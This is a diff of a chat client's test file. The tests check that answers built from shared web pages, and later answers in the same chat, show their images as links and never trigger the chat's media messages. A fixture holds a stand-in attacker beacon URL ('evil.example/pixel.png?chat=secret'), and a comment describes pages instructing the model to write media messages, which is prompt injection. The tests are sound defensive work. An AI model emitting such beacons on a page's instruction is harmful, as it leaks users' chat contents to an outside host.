@@ -17,32 +17,50 @@ import {
   readVideoMessage,
 } from "./chatPanelMessages";
 import { buildVideoMessage } from "./chatVideo";
-import { answerImages, mediaContent, readSharedPages, sharedPagesLabel } from "./sharedPages";
+import { answerImages, mediaContent, readSharedPages, sharedPagesLabel, sharedPagesNote } from "./sharedPages";
 
 describe("the server's mark on an answer built from shared pages", () => {
   it("is read with its sites", () => {
-    expect(readSharedPages({ sites: ["docs.example.com", "intranet"] })).toEqual({ sites: ["docs.example.com", "intranet"] });
+    expect(readSharedPages({ sites: ["docs.example.com", "intranet"] })).toEqual({
+      sites: ["docs.example.com", "intranet"],
+      inherited: false,
+    });
+  });
+
+  it("says when the answer only follows a shared page in the same chat", () => {
+    expect(readSharedPages({ sites: ["docs.example.com"], inherited: true })).toEqual({
+      sites: ["docs.example.com"],
+      inherited: true,
+    });
+    expect(readSharedPages({ sites: [], inherited: "yes" })?.inherited).toBe(false);
   });
 
   it("still counts when its sites are missing or unusable: the protection never hinges on them", () => {
-    expect(readSharedPages({})).toEqual({ sites: [] });
-    expect(readSharedPages({ sites: [42, "", "x".repeat(300), "ok.example"] })).toEqual({ sites: ["ok.example"] });
+    expect(readSharedPages({})).toEqual({ sites: [], inherited: false });
+    expect(readSharedPages({ sites: [42, "", "x".repeat(300), "ok.example"] })?.sites).toEqual(["ok.example"]);
   });
+
+  it.each(["docs.example.com", 1, 0, false, true, "", ["docs.example.com"]])(
+    "still counts when it is %j: anything the server sent is a mark",
+    (value) => {
+      expect(readSharedPages(value)).toEqual({ sites: [], inherited: false });
+    },
+  );
 
   it("keeps at most twenty sites", () => {
     const sites = Array.from({ length: 25 }, (_, i) => `s${i}.example`);
     expect(readSharedPages({ sites })?.sites).toHaveLength(20);
   });
 
-  it.each([undefined, null, "docs.example.com", 1, ["docs.example.com"]])("is absent for %j", (value) => {
+  it.each([undefined, null])("is absent for %j", (value) => {
     expect(readSharedPages(value)).toBeUndefined();
   });
 });
 
 describe("how the chat shows such an answer", () => {
   it("never loads its images", () => {
-    expect(answerImages({ pageContext: { sites: ["docs.example.com"] } })).toBe("link");
-    expect(answerImages({ pageContext: { sites: [] } })).toBe("link");
+    expect(answerImages({ pageContext: { sites: ["docs.example.com"], inherited: false } })).toBe("link");
+    expect(answerImages({ pageContext: { sites: [], inherited: true } })).toBe("link");
     expect(answerImages({})).toBe("load");
   });
 
@@ -52,12 +70,26 @@ describe("how the chat shows such an answer", () => {
     [["a.example", "b.example"], "From pages on a.example and b.example"],
     [["a.example", "b.example", "c.example"], "From pages on a.example and 2 other sites"],
   ])("labels %j as %s", (sites, label) => {
-    expect(sharedPagesLabel({ sites })).toBe(label);
+    expect(sharedPagesLabel({ sites, inherited: false })).toBe(label);
+  });
+
+  it.each([
+    [[], "In a chat with a shared page"],
+    [["docs.example.com"], "In a chat with a page from docs.example.com"],
+    [["a.example", "b.example"], "In a chat with pages from a.example and b.example"],
+    [["a.example", "b.example", "c.example"], "In a chat with pages from a.example and 2 other sites"],
+  ])("labels a later answer in a chat with %j as %s", (sites, label) => {
+    expect(sharedPagesLabel({ sites, inherited: true })).toBe(label);
+  });
+
+  it("explains why its images are links", () => {
+    expect(sharedPagesNote({ sites: ["a.example"], inherited: false })).toMatch(/^Built from a page .* shown as links/);
+    expect(sharedPagesNote({ sites: ["a.example"], inherited: true })).toMatch(/^An earlier answer in this chat .* shown as links/);
   });
 });
 
 describe("the chat's own media messages", () => {
-  const marked = { sites: ["evil.example"] };
+  const marked = { sites: ["evil.example"], inherited: false };
   const beacon = "https://evil.example/pixel.png?chat=secret";
 
   // Each is something a page could tell the model to write, and each would
@@ -81,7 +113,7 @@ describe("the chat's own media messages", () => {
 
   it.each(cases)("are never read from an answer built from a shared page: %s", (_name, content, read) => {
     expect(read(mediaContent({ content, pageContext: marked }))).toBeFalsy();
-    expect(read(mediaContent({ content, pageContext: { sites: [] } }))).toBeFalsy();
+    expect(read(mediaContent({ content, pageContext: { sites: [], inherited: true } }))).toBeFalsy();
   });
 
   it.each([IMAGE_PENDING_MARKER, VIDEO_PENDING_MARKER, SPEECH_PENDING_MARKER])(
